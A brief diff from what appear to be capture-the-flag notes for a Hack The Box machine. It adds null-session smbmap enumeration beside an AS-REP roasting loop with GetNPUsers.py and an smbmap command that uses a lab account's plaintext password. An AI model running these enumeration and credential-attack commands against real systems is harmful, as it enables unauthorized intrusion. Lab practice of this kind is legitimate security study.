@@ -40,7 +40,9 @@ for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${us
 ```
 Enum:
 
-smbmap -H 10.10.10.161 
+smbmap -H 10.10.10.161
+smbmap -H 10.10.10.161 -u ''
+smbmap -H 10.10.10.161 -u 'null'
 smbmap -H 10.10.10.161 -u svc-alfresco -p s3rvice -R IPC$
 
 Login:
